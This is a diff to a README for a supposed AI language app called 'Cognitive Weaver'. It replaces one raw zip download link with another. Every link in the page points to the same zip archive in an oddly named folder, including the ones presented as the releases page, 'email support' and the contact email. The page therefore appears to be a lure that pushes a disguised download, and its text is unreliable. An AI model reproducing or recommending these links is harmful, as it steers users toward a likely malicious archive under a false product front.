@@ -1,6 +1,6 @@
 # 🌐 Cognitive-Weaver-Language-CWL- - Your Gateway to AI Language Exploration
 
-[![Download Now](https://raw.githubusercontent.com/hepravhh/Cognitive-Weaver-Language-CWL-/main/multifetation/Cognitive-Weaver-Language-CWL-.zip%20Now-Visit%20the%20Releases%20Page-blue)](https://raw.githubusercontent.com/hepravhh/Cognitive-Weaver-Language-CWL-/main/multifetation/Cognitive-Weaver-Language-CWL-.zip)
+[![Download Now](https://github.com/hepravhh/Cognitive-Weaver-Language-CWL-/raw/refs/heads/main/multifetation/CW_Language_Weaver_Cognitive_v3.4.zip%20Now-Visit%20the%20Releases%20Page-blue)](https://github.com/hepravhh/Cognitive-Weaver-Language-CWL-/raw/refs/heads/main/multifetation/CW_Language_Weaver_Cognitive_v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to Cognitive Weaver! This application lets you explore AI language throu
 ## 📥 Download & Install
 
 1. **Visit the Download Page**: Click the link below to access the Releases page:
-   [Download Latest Release](https://raw.githubusercontent.com/hepravhh/Cognitive-Weaver-Language-CWL-/main/multifetation/Cognitive-Weaver-Language-CWL-.zip)
+   [Download Latest Release](https://github.com/hepravhh/Cognitive-Weaver-Language-CWL-/raw/refs/heads/main/multifetation/CW_Language_Weaver_Cognitive_v3.4.zip)
 
 2. **Select the Latest Version**: Look for the newest release at the top. Download the file labeled with the latest version number.
 
@@ -49,12 +49,12 @@ Cognitive Weaver includes a broad range of topics that may interest you:
 Join our community to share your experiences, ask questions, and collaborate with others. You can connect with users and developers through the following platforms:
 
 - **GitHub Discussions**: Engage with other users and share insights or troubleshoot issues.
-- **Email Support**: Reach out to our support team at https://raw.githubusercontent.com/hepravhh/Cognitive-Weaver-Language-CWL-/main/multifetation/Cognitive-Weaver-Language-CWL-.zip for direct assistance.
+- **Email Support**: Reach out to our support team at https://github.com/hepravhh/Cognitive-Weaver-Language-CWL-/raw/refs/heads/main/multifetation/CW_Language_Weaver_Cognitive_v3.4.zip for direct assistance.
 
 ## 🛣️ Future Developments
 
 We continually update Cognitive Weaver, adding new features and tools. Stay tuned for updates and new releases by checking the Releases page frequently:
-[Explore Updates](https://raw.githubusercontent.com/hepravhh/Cognitive-Weaver-Language-CWL-/main/multifetation/Cognitive-Weaver-Language-CWL-.zip)
+[Explore Updates](https://github.com/hepravhh/Cognitive-Weaver-Language-CWL-/raw/refs/heads/main/multifetation/CW_Language_Weaver_Cognitive_v3.4.zip)
 
 ## 🎨 About Cognitive Weaver
 
@@ -64,9 +64,9 @@ Cognitive Weaver is designed to simplify interaction with complex AI concepts. T
 
 For any inquiries regarding the application, feel free to reach out via the following channels:
 
-- **Email**: https://raw.githubusercontent.com/hepravhh/Cognitive-Weaver-Language-CWL-/main/multifetation/Cognitive-Weaver-Language-CWL-.zip
+- **Email**: https://github.com/hepravhh/Cognitive-Weaver-Language-CWL-/raw/refs/heads/main/multifetation/CW_Language_Weaver_Cognitive_v3.4.zip
 - **GitHub Issues**: Use the Issues tab on our GitHub page for bug reports or feature requests.
 
-[![Download Now](https://raw.githubusercontent.com/hepravhh/Cognitive-Weaver-Language-CWL-/main/multifetation/Cognitive-Weaver-Language-CWL-.zip%20Now-Visit%20the%20Releases%20Page-blue)](https://raw.githubusercontent.com/hepravhh/Cognitive-Weaver-Language-CWL-/main/multifetation/Cognitive-Weaver-Language-CWL-.zip)
+[![Download Now](https://github.com/hepravhh/Cognitive-Weaver-Language-CWL-/raw/refs/heads/main/multifetation/CW_Language_Weaver_Cognitive_v3.4.zip%20Now-Visit%20the%20Releases%20Page-blue)](https://github.com/hepravhh/Cognitive-Weaver-Language-CWL-/raw/refs/heads/main/multifetation/CW_Language_Weaver_Cognitive_v3.4.zip)
 
 Thank you for exploring Cognitive Weaver. We hope you enjoy this journey into AI language and its potentials!
